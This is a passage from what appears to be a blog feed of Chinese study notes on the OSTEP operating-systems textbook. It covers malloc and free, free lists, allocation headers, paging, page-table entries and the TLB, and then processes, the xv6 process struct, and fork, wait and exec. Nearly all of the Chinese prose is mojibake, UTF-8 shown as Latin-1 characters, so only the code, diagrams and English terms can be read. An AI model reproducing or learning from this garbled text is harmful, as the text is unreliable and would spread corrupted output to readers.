size)</span></span><br></code></pre></td></tr></table></figure><ul><li>sizeæ˜¯è¯·æ±‚çš„å­—èŠ‚æ•°ã€‚å‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡é’ˆï¼ˆæ²¡æœ‰å…·ä½“çš„ç±»å‹ï¼Œåœ¨ C è¯­è¨€çš„æœ¯è¯­ä¸­æ˜¯ void ç±»å‹ï¼‰ï¼ŒæŒ‡å‘sizeå¤§å°ï¼ˆæˆ–è¾ƒå¤§ä¸€ç‚¹ï¼‰çš„ä¸€å—ç©ºé—´ï¼Œvoid* ç±»å‹å¯ä»¥å¼ºåˆ¶è½¬æ¢ä¸ºä»»ä½•å…¶å®ƒç±»å‹çš„æŒ‡é’ˆ</li><li>åˆ†é…æˆåŠŸåˆ™è¿”å›æŒ‡å‘è¢«åˆ†é…å†…å­˜çš„æŒ‡é’ˆï¼Œå¤±è´¥è¿”å›ç©ºæŒ‡é’ˆNULLï¼ˆè¦æ³¨æ„é”™è¯¯å¤„ç†ï¼‰</li><li>mallocåçš„éœ€è¦é…åˆfreeä½¿ç”¨ï¼Œå¦åˆ™ä¼šå¯¼è‡´å†…å­˜æ³„éœ²ï¼ˆè™½ç„¶è¿›ç¨‹é€€å‡ºçš„æ—¶å€™osä¼šå›æ”¶è¿™éƒ¨åˆ†å†…å­˜ï¼Œä½†æ˜¯ä¸freeä»æ˜¯ä¸€ç§ä¸å¥½çš„è¡Œä¸ºï¼Œæ¯”å¦‚webæœåŠ¡å™¨è¿™ç§é•¿æ—¶é—´è¿è¡Œçš„è¿›ç¨‹çš„å†…å­˜æ³„éœ²æ˜¯å¾ˆä¸¥é‡çš„ï¼Œ å¹¶ä¸”å¾ˆéš¾æ’æŸ¥ï¼‰</li></ul><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-built_in">void</span> free(<span class="hljs-built_in">void</span> *<span class="hljs-keyword">ptr</span>)<br></code></pre></td></tr></table></figure><ul><li>å‡½æ•°æ¥å—ä¸€ä¸ªæŒ‡é’ˆï¼Œä¸éœ€è¦æŒ‡å®šè¿™å—ç©ºé—´çš„å¤§å°ï¼Œå³å¯é‡Šæ”¾å¯¹åº”çš„å†…å­˜å—</li><li>åœ¨åªä¼ å…¥ä¸€ä¸ªæŒ‡é’ˆçš„æƒ…å†µä¸‹ï¼Œåº“å¿…é¡»èƒ½å¤Ÿå¼„æ¸…æ¥šè¿™å—å†…å­˜çš„å¤§å°</li></ul><h2 id="Linuxå†…å­˜å¸ƒå±€"><a href="#Linuxå†…å­˜å¸ƒå±€" class="headerlink" title="Linuxå†…å­˜å¸ƒå±€"></a>Linuxå†…å­˜å¸ƒå±€</h2><p><img src="/image/ostep/addrspace.png"></p><h2 id="ç©ºé—²é“¾è¡¨"><a href="#ç©ºé—²é“¾è¡¨" class="headerlink" title="ç©ºé—²é“¾è¡¨"></a>ç©ºé—²é“¾è¡¨</h2><p>ç©ºé—²é“¾è¡¨è®°å½•äº†å †ä¸­çš„å“ªäº›ç©ºé—´è¿˜æ²¡æœ‰åˆ†é…</p><p>å‡è®¾è¿™æ˜¯å †ä¸­ç©ºé—´å¸ƒå±€</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------------------------+</span><br>|        |         |         |<br><span class="hljs-section">| used   |  free | used    |</span><br><span class="hljs-section">+----------------------------+</span><br>0       10        20         30<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå¯¹åº”çš„é“¾è¡¨ç»“æ„ä¸ºï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                         +------------+                 +-------------+                   <br>                         |<span class="hljs-string">            </span>|<span class="hljs-string">                 </span>|<span class="hljs-string">             </span>|<span class="hljs-string">                   </span><br><span class="hljs-string">                         </span>|<span class="hljs-string">  addr:0    </span>|<span class="hljs-string">                 </span>|<span class="hljs-string">   addr:20   </span>|<span class="hljs-string">                   </span><br><span class="hljs-string"> head     -----------&gt;   </span>|<span class="hljs-string">  len:10    </span>|<span class="hljs-string">    ---------&gt;   </span>|<span class="hljs-string">   len:10    </span>|<span class="hljs-string"> ----------&gt;   NULL</span><br><span class="hljs-string">                         </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                 </span>|<span class="hljs-string">             </span>|<span class="hljs-string">                   </span><br><span class="hljs-string">                         +------------+                 +-------------+                   </span><br><span class="hljs-string"></span><br><span class="hljs-string">typedef struct node_t &#123;</span><br><span class="hljs-string">    int size;</span><br><span class="hljs-string">    struct node_t *next;</span><br><span class="hljs-string">&#125; node_t;</span><br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ä½¿ç”¨malloc(20)åœ¨å †ä¸­åˆ†é…å‡º20ä¸ªå­—èŠ‚çš„ç©ºé—´æ—¶ï¼Œæ‰€å ç”¨çš„ä¸ä»…ä»…æ˜¯20å­—èŠ‚ï¼Œå› ä¸ºå¤´å—ï¼ˆheaderï¼‰ä¸­ä¿å­˜ä¸€ç‚¹é¢å¤–çš„ä¿¡æ¯</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">header_t</span> &#123;</span><br>    <span class="hljs-keyword">int</span> size;<span class="hljs-comment">//æ‰€åˆ†é…ç©ºé—´çš„å¤§å°</span><br>    <span class="hljs-keyword">int</span> magic;<span class="hljs-comment">//å¹»æ•°ï¼Œæä¾›å®Œæ•´æ€§æ£€æŸ¥</span><br>&#125; <span class="hljs-keyword">header_t</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span> </span>&#123;<br>    <span class="hljs-keyword">header_t</span> *hptr = (<span class="hljs-keyword">void</span> *)ptr - <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-keyword">header_t</span>);<span class="hljs-comment">//å¾—åˆ°å¤´å—çš„ä½ç½®</span><br>&#125;<br><br><br><br>       hptr<br><br>               â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>                         â”‚            â”‚<br>                         â”‚  size:<span class="hljs-number">20</span>   â”‚  <span class="hljs-keyword">header_t</span><br>                         â”‚            â”‚<br>       ptr     â”€â”€â”€â”€â”€â”€â”€â”€â–º â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                         â”‚            â”‚<br>                         â”‚  magic     â”‚<br>                         â”‚            â”‚<br>                         â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                         â”‚            â”‚<br>                         â”‚            â”‚<br>                         â”‚            â”‚<br>                         â”‚            â”‚  allocated bytes<br>                         â”‚            â”‚<br>                         â”‚            â”‚<br>                         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br></code></pre></td></tr></table></figure><h1 id="åˆ†é¡µ"><a href="#åˆ†é¡µ" class="headerlink" title="åˆ†é¡µ"></a>åˆ†é¡µ</h1><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p>åˆ†é¡µï¼šå°†å†…å­˜åˆ†å‰²æˆå›ºå®šå¤§å°çš„å•å…ƒï¼Œæ¯ä¸ªå•å…ƒç§°ä¸ºä¸€é¡µ</p><p>è™šæ‹Ÿåœ°å€ï¼š[è™šæ‹Ÿé¡µå·][é¡µå†…åç§»]</p><ul><li>å°†è™šæ‹Ÿé¡µæ˜ å°„åˆ°ç‰©ç†é¡µï¼Œåç§»å¾—åˆ°ç‰©ç†åœ°å€</li><li>è™šæ‹Ÿé¡µé¢å·ï¼ˆvirtual page numberï¼ŒVPNï¼‰</li><li>ç‰©ç†é¡µå·ï¼ˆphysical page numberï¼ŒPFNï¼‰</li></ul><p>é¡µè¡¨</p><ul><li>é¡µè¡¨åŸºå€å¯„å­˜å™¨ï¼ˆpage-table base registerï¼‰åŒ…å«é¡µè¡¨çš„èµ·å§‹ä½ç½®çš„ç‰©ç†åœ°å€</li><li>è®°å½•åœ°å€ç©ºé—´çš„æ¯ä¸ªè™šæ‹Ÿé¡µæ”¾åœ¨ç‰©ç†å†…å­˜ä¸­çš„ä½ç½®ï¼Œæ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œç”¨äºå°†è™šæ‹Ÿåœ°å€ï¼ˆæˆ–è€…å®é™…ä¸Šï¼Œæ˜¯è™šæ‹Ÿé¡µå·ï¼‰æ˜ å°„åˆ°ç‰©ç†åœ°å€ï¼ˆç‰©ç†å¸§å·ï¼‰</li><li>æ¯ä¸ªè¿›ç¨‹ä¿å­˜ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œç§°ä¸ºé¡µè¡¨ï¼Œé¡µè¡¨çš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºåœ°å€ç©ºé—´çš„æ¯ä¸ªè™šæ‹Ÿé¡µé¢ä¿å­˜åœ°å€è½¬æ¢ï¼ˆaddress translationï¼‰</li></ul><h2 id="é¡µè¡¨å¤§å°çš„è€ƒè™‘"><a href="#é¡µè¡¨å¤§å°çš„è€ƒè™‘" class="headerlink" title="é¡µè¡¨å¤§å°çš„è€ƒè™‘"></a>é¡µè¡¨å¤§å°çš„è€ƒè™‘</h2><p>å¯¹äº32 ä½åœ°å€ç©ºé—´ï¼Œå‡è®¾ä¸€ä¸ªé¡µå¤§å°ä¸º4KBï¼Œé‚£ä¹ˆï¼š</p><ul><li>ä¸€ä¸ªé¡µæœ‰2^12ä¸ªå­—èŠ‚ï¼Œä¹Ÿå³æ˜¯é¡µå†…åç§»ä¸º12ä½</li><li>2^32 / 2^12 = 2^20 ï¼Œä¹Ÿå³æ˜¯éœ€è¦2^20ä¸ªé¡µ</li></ul><p>å› æ­¤ï¼Œå¯¹äºæ¯ä¸ªè¿›ç¨‹ï¼Œæ“ä½œç³»ç»Ÿéœ€è¦ä¸ºå…¶ç»´æŠ¤2^20ä¸ªé¡µè¡¨è½¬æ¢ï¼Œå‡è®¾ä¸€ä¸ªè½¬æ¢éœ€è¦4å­—èŠ‚ï¼Œåˆ™æ¯ä¸ªè¿›ç¨‹éœ€è¦2^22å­—èŠ‚ï¼Œä¹Ÿå³æ˜¯4MBçš„å†…å­˜ï¼Œå¯¹äºå¤šè¿›ç¨‹æ¥è¯´ï¼Œè¿™ä¸ªå¼€é”€æ˜¯ååˆ†å·¨å¤§çš„</p><h2 id="é¡µè¡¨é¡¹"><a href="#é¡µè¡¨é¡¹" class="headerlink" title="é¡µè¡¨é¡¹"></a>é¡µè¡¨é¡¹</h2><p>æœ€ç®€å•çš„é¡µè¡¨å®ç°æ˜¯çº¿æ€§é¡µè¡¨ï¼Œå®ƒçš„æœ¬è´¨æ˜¯ä¸€ä¸ªæ•°ç»„ä¹Ÿå³æ˜¯é€šè¿‡è™šæ‹Ÿé¡µå·ï¼ˆVPNï¼‰æ£€ç´¢è¯¥æ•°ç»„ï¼Œå¹¶åœ¨è¯¥ç´¢å¼•å¤„æŸ¥æ‰¾é¡µè¡¨é¡¹ï¼ˆPTEï¼‰ï¼Œæ‰¾åˆ°æœŸæœ›çš„ç‰©ç†å¸§å·ï¼ˆPFNï¼‰</p><p>ä¸€ä¸ª x86 æ¶æ„çš„ç¤ºä¾‹é¡µè¡¨é¡¹ï¼š<br><img src="/image/ostep/Snipaste_2022-09-26_17-33-23.png"></p><ul><li>å­˜åœ¨ä½ï¼ˆPï¼‰ï¼Œè¡¨ç¤ºè¯¥é¡µæ˜¯åœ¨ç‰©ç†å­˜å‚¨å™¨è¿˜æ˜¯åœ¨ç£ç›˜ä¸Šï¼ˆå³å®ƒå·²è¢«æ¢å‡ºï¼Œswapped outï¼‰</li><li>è¯»/å†™ä½ï¼ˆR/Wï¼‰</li><li>è®¿é—®ä½ï¼ˆAï¼‰ï¼Œæœ‰æ—¶ç”¨äºè¿½è¸ªé¡µæ˜¯å¦è¢«è®¿é—®ï¼Œä¹Ÿç”¨äºç¡®å®šå“ªäº›é¡µå¾ˆå—æ¬¢è¿ï¼Œå› æ­¤åº”è¯¥ä¿ç•™åœ¨å†…å­˜ä¸­</li><li>è„ä½ï¼ˆDï¼‰ï¼Œé¡µé¢è¢«å¸¦å…¥å†…å­˜åæ˜¯å¦è¢«ä¿®æ”¹è¿‡</li><li>é¡µå¸§å·ï¼ˆPFNï¼‰</li></ul><h1 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h1><p>åœ°å€è½¬æ¢æ—è·¯ç¼“å†²å­˜å‚¨å™¨ ï¼ˆtranslation-lookaside bufferï¼ŒTLBï¼‰</p><ul><li>æ˜¯é¢‘ç¹å‘ç”Ÿçš„è™šæ‹Ÿåˆ°ç‰©ç†åœ°å€è½¬æ¢çš„ç¡¬ä»¶ç¼“å­˜ï¼ˆcacheï¼‰</li><li>å·¥ä½œå·¥ç¨‹ï¼šå¯¹äºæ¯æ¬¡å†…å­˜è®¿é—®ï¼Œå…ˆä»è™šæ‹Ÿåœ°å€ä¸­æå–é¡µå·ï¼ˆVPNï¼‰ï¼ŒæŸ¥çœ‹tlbæ˜¯å¦å‘½ä¸­ï¼Œå¦‚æœæœªå‘½ä¸­ï¼Œåˆ™è®¿é—®é¡µè¡¨ï¼ˆè¿™ä¼šé€ æˆå·¨å¤§çš„å¼€é”€ï¼‰</li></ul><p>é¡µè¡¨ä¸TLBçš„æœ‰æ•ˆä½ï¼š</p><ul><li>é¡µè¡¨ä¸­é¡µè¡¨é¡¹ï¼ˆPTEï¼‰è‹¥è¢«æ ‡è®°ä¸ºæ— æ•ˆï¼Œå°±æ„å‘³ç€è¯¥é¡µå¹¶æ²¡æœ‰è¢«è¿›ç¨‹ç”³è¯·ä½¿ç”¨ï¼Œæ­£å¸¸è¿è¡Œçš„ç¨‹åºä¸åº”è¯¥è®¿é—®è¯¥åœ°å€</li><li>TLB çš„æœ‰æ•ˆä½ä¸åŒç”¨æ¥æ ‡å¿— TLB é¡¹æ˜¯ä¸æ˜¯æœ‰æ•ˆçš„åœ°å€æ˜ å°„</li></ul><p>è¿›ç¨‹åˆ‡æ¢æ—¶ï¼Œå¯¹äºä¸åŒçš„è¿›ç¨‹ï¼ŒTLBçš„å†…å®¹æ²¡æœ‰æ„ä¹‰ã€‚å€˜è‹¥ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æ—¶å€™æ¸…ç©º TLBï¼Œé‚£ä¹ˆä¼šå¯¼è‡´æœªå‘½ä¸­ï¼Œé€ æˆå¤§é‡çš„å¼€é”€ã€‚å› æ­¤å¯ä»¥ç»™TLBåŠ ä¸Šåœ°å€ç©ºé—´æ ‡è¯†ç¬¦ï¼ˆAddress Space Identifierï¼ŒASIDï¼‰ï¼Œä»è€Œæ ‡å¿—ä¸åŒçš„è¿›ç¨‹</p><p>è€ƒè™‘åˆ°æ¢å…¥æ¢å‡ºå¼€é”€ï¼Œå¯ä»¥æ›¿æ¢æœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼ˆleast-recently-usedï¼ŒLRUï¼‰çš„é¡¹</p>]]></content>
    
    
    <categories>
      
      <category>OSTEP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OSTEP NOTES &amp; HWï¼šè¿›ç¨‹</title>
    <link href="/p/9e7f5052/"/>
    <url>/p/9e7f5052/</url>
    
    <content type="html"><![CDATA[<h1 id="è¿›ç¨‹æ˜¯ä»€ä¹ˆ"><a href="#è¿›ç¨‹æ˜¯ä»€ä¹ˆ" class="headerlink" title="è¿›ç¨‹æ˜¯ä»€ä¹ˆ"></a>è¿›ç¨‹æ˜¯ä»€ä¹ˆ</h1><p>è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿä¸ºæ­£åœ¨è¿è¡Œçš„ç¨‹åºæä¾›çš„æŠ½è±¡</p><p>ç¨‹åºæœ¬èº«æ˜¯æ²¡æœ‰ç”Ÿå‘½å‘¨æœŸçš„ï¼Œå®ƒåªæ˜¯å­˜åœ¨ç£ç›˜ä¸Šé¢çš„ä¸€äº›æŒ‡ä»¤ä¸é™æ€æ•°æ®ï¼Œé‚£ä¹ˆæ“ä½œç³»ç»Ÿå¦‚ä½•åˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ï¼Ÿ</p><ul><li>å°†ä»£ç å’Œé™æ€æ•°æ®ä»ç£ç›˜ä¸­åŠ è½½åˆ°å†…å­˜ä¸­è¿›ç¨‹çš„åœ°å€ç©ºé—´<ul><li>æ—©æœŸç³»ç»Ÿä¼šæŠŠæ‰€æœ‰æ•°æ®åœ¨ç¨‹åºè¿è¡Œå‰åŠ è½½å®Œæˆï¼Œç°ä»£æ“ä½œç³»ç»Ÿä½¿ç”¨æ‡’åŠ è½½ï¼Œä¹Ÿå³æ˜¯åœ¨ç¨‹åºæ‰§è¡ŒæœŸé—´éœ€è¦åŠ è½½çš„ä»£ç æˆ–æ•°æ®ç‰‡æ®µï¼Œæ‰ä¼šåŠ è½½</li></ul></li><li>ä¸ºç¨‹åºçš„è¿è¡Œæ—¶æ ˆåˆ†é…å†…å­˜</li><li>ä¸ºå †åˆ†é…å†…å­˜</li><li>ä¸€äº›åˆ«çš„åˆå§‹åŒ–ä»»åŠ¡ï¼Œæ¯”å¦‚åœ¨ UNIX ç³»ç»Ÿä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ 3 ä¸ªæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰ï¼Œåˆ†åˆ«å¯¹åº”æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯</li><li>è·³è½¬åˆ°ç¨‹åºçš„mainå‡½æ•°å…¥å£å¤„è¿è¡Œ</li></ul><h1 id="è¿›ç¨‹çŠ¶æ€"><a href="#è¿›ç¨‹çŠ¶æ€" class="headerlink" title="è¿›ç¨‹çŠ¶æ€"></a>è¿›ç¨‹çŠ¶æ€</h1><p>è¿›ç¨‹å¯ä»¥å¤„äºä»¥ä¸‹çŠ¶æ€ä¹‹ä¸€</p><p><img src="/image/ostep/Snipaste_2022-09-15_14-35-32.png"></p><ul><li>è¿è¡Œ running<ul><li>æ­£åœ¨è¢«CPUæ‰§è¡Œ</li></ul></li><li>å°±ç»ª ready<ul><li>å·²ç»å‡†å¤‡å¥½è¿è¡Œï¼Œå¯ä»¥è½¬æ¢ä¸ºè¿è¡Œæ€</li></ul></li><li>é˜»å¡ blocked <ul><li>ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œäº†æŸç§æ“ä½œï¼ˆæ¯”å¦‚å‘ç£ç›˜å‘èµ·I/Oè¯·æ±‚ï¼‰ï¼Œä»–å°±ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°å‘ç”Ÿå…¶ä»–äº‹ä»¶æ—¶æ‰ä¼šå‡†å¤‡è¿è¡Œ</li><li>é˜»å¡æ€çš„ç¨‹åºä¸å¯ä»¥ç›´æ¥è½¬ä¸ºè¿è¡Œæ€ï¼Œéœ€è¦å…ˆè½¬ä¸ºå°±ç»ªæ€æ‰å¯ä»¥è½¬ä¸ºè¿è¡Œæ€</li></ul></li><li>åˆå§‹ initial<ul><li>è¿›ç¨‹åˆšè¢«åˆ›å»º</li></ul></li><li>æœ€ç»ˆ final <ul><li>ä¹Ÿè¢«ç§°ä¸ºåƒµå°¸çŠ¶æ€</li></ul></li></ul><h1 id="è¿›ç¨‹çš„æ•°æ®ç»“æ„"><a href="#è¿›ç¨‹çš„æ•°æ®ç»“æ„" class="headerlink" title="è¿›ç¨‹çš„æ•°æ®ç»“æ„"></a>è¿›ç¨‹çš„æ•°æ®ç»“æ„</h1><p>è¿›ç¨‹çš„æœºå™¨çŠ¶æ€ï¼š</p><ul><li>è¿›ç¨‹å¯ä»¥è®¿é—®çš„å†…å­˜ï¼ˆåœ°å€ç©ºé—´ï¼‰</li><li>å¯„å­˜å™¨ã€‚è®¸å¤šæŒ‡ä»¤æ˜ç¡®åœ°è¯»å–æˆ–æ›´æ–°å¯„å­˜å™¨ï¼Œä»–ä»¬æ„æˆäº†è¯¥æœºå™¨çŠ¶æ€çš„ä¸€éƒ¨åˆ†</li></ul><p>ä»¥xv6ä¸ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// the registers xv6 will save and restore</span><br><span class="hljs-comment">// to stop and subsequently restart a process</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> &#123;</span><br><span class="hljs-keyword">int</span> eip;<br><span class="hljs-keyword">int</span> esp;<br><span class="hljs-keyword">int</span> ebx;<br><span class="hljs-keyword">int</span> ecx;<br><span class="hljs-keyword">int</span> edx;<br><span class="hljs-keyword">int</span> esi;<br><span class="hljs-keyword">int</span> edi;<br><span class="hljs-keyword">int</span> ebp;<br>&#125;;<br><br><br><span class="hljs-comment">// the different states a process can be in</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">proc_state</span> &#123;</span> UNUSED, EMBRYO, SLEEPING,<br>RUNNABLE, RUNNING, ZOMBIE &#125;;<br><br><br><span class="hljs-comment">// the information xv6 tracks about each process</span><br><span class="hljs-comment">// including its register context and state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br><span class="hljs-keyword">char</span> *mem; <span class="hljs-comment">// Start of process memory</span><br>uint sz; <span class="hljs-comment">// Size of process memory</span><br><span class="hljs-keyword">char</span> *kstack; <span class="hljs-comment">// Bottom of kernel stack</span><br><span class="hljs-comment">// for this process</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">proc_state</span> <span class="hljs-title">state</span>;</span> <span class="hljs-comment">// Process state</span><br><span class="hljs-keyword">int</span> pid; <span class="hljs-comment">// Process ID</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span> <span class="hljs-comment">// Parent process</span><br><span class="hljs-keyword">void</span> *chan; <span class="hljs-comment">// If non-zero, sleeping on chan</span><br><span class="hljs-keyword">int</span> killed; <span class="hljs-comment">// If non-zero, have been killed</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span> <span class="hljs-comment">// Open files</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span> <span class="hljs-comment">// Current directory</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span> <span class="hljs-comment">// Switch here to run process</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span>;</span> <span class="hljs-comment">// Trap frame for the</span><br><span class="hljs-comment">// current interrupt</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><h1 id="è¿›ç¨‹API"><a href="#è¿›ç¨‹API" class="headerlink" title="è¿›ç¨‹API"></a>è¿›ç¨‹API</h1><h2 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h2><ul><li>forkå‡½æ•°æ‰§è¡Œåï¼Œåå°†å­˜åœ¨ä¸¤ä¸ªè¿›ç¨‹ï¼Œä¸”æ¯ä¸ªè¿›ç¨‹éƒ½ä¼šä» fork()çš„è¿”å›å¤„ç»§ç»­æ‰§è¡Œ</li><li>æ–°çš„å­è¿›ç¨‹å‡ è¿‘äºå¯¹çˆ¶è¿›ç¨‹çš„ç¿»ç‰ˆï¼šå­è¿›ç¨‹è·å¾—çˆ¶è¿›ç¨‹çš„æ ˆã€æ•°æ®æ®µã€å †å’Œæ‰§è¡Œæ–‡æœ¬æ®µçš„æ‹·è´</li><li>æ‰§è¡Œ fork()ä¹‹åï¼Œæ¯ä¸ªè¿›ç¨‹å‡å¯ä¿®æ”¹å„è‡ªçš„æ ˆæ•°æ®ã€ä»¥åŠå †æ®µä¸­çš„å˜é‡ï¼Œè€Œå¹¶ä¸å½±å“å¦ä¸€è¿›ç¨‹</li><li>çˆ¶è¿›ç¨‹çš„forkè¿”å›å€¼ä¸ºå­è¿›ç¨‹çš„pidï¼Œå­è¿›ç¨‹çš„forkè¿”å›å€¼ä¸º0<h2 id="wait"><a href="#wait" class="headerlink" title="wait"></a>wait</h2>çˆ¶å­è¿›ç¨‹çš„å‰åé¡ºåºæ˜¯ä¸å›ºå®šçš„ï¼Œå¦‚æœçˆ¶è¿›ç¨‹æƒ³è¦ç­‰å¾…å­è¿›ç¨‹ç»“æŸä¹‹åå†è¿›è¡ŒæŸç§æ“ä½œï¼Œçˆ¶è¿›ç¨‹å¯ä»¥å…ˆè°ƒç”¨ wait()ï¼Œè¯¥ç³»ç»Ÿè°ƒç”¨ä¼šåœ¨å­è¿›ç¨‹è¿è¡Œç»“æŸåæ‰è¿”å›ï¼Œä»è€Œå»¶è¿Ÿè‡ªå·±çš„æ‰§è¡Œï¼Œç›´åˆ°å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•</li></ul><h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><p>fork+execå¯ä»¥è®©å­è¿›ç¨‹æ‰§è¡Œä¸çˆ¶è¿›ç¨‹ä¸åŒçš„ç¨‹åºã€‚ç»™æˆ‘å¯æ‰§è¡Œç¨‹åºçš„åç§°ä»¥åŠéœ€è¦çš„å‚æ•°åï¼Œexec()ä¼šä»å¯æ‰§è¡Œç¨‹åºä¸­åŠ è½½ä»£ç å’Œé™æ€æ•°æ®ï¼Œå¹¶ç”¨å®ƒè¦†å†™è‡ªå·±çš„ä»£ç æ®µï¼ˆä»¥åŠé™æ€æ•°æ®ï¼‰ï¼Œå †ã€æ ˆåŠå…¶ä»–å†…å­˜ç©ºé—´ä¹Ÿä¼šè¢«é‡æ–°åˆå§‹åŒ–ã€‚ç„¶åæ“ä½œç³»ç»Ÿå°±æ‰§è¡Œè¯¥ç¨‹åºï¼Œå°†å‚æ•°é€šè¿‡ argv ä¼ é€’ç»™è¯¥è¿›ç¨‹</p><p><img src="https://img-blog.csdnimg.cn/9ba130a0de0146db90b3050a63bb95e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="CPUè™šæ‹ŸåŒ–ä¸è¿›ç¨‹"><a href="#CPUè™šæ‹ŸåŒ–ä¸è¿›ç¨‹" class="headerlink" title="CPUè™šæ‹ŸåŒ–ä¸è¿›ç¨‹"></a>CPUè™šæ‹ŸåŒ–ä¸è¿›ç¨‹</h1><p>ä¸€äº›ç›®æ ‡ï¼š</p><ul><li>å¦‚ä½•æä¾›æœ‰è®¸å¤š CPU çš„å‡è±¡ï¼Œä½¿å¾—è®©æˆ‘ä»¬æ„Ÿè§‰åŒæ—¶æœ‰è®¸å¤šè¿›ç¨‹åŒæ—¶è¿è¡Œï¼Ÿ</li><li>æ€§èƒ½ï¼šå¦‚ä½•åœ¨ä¸å¢åŠ 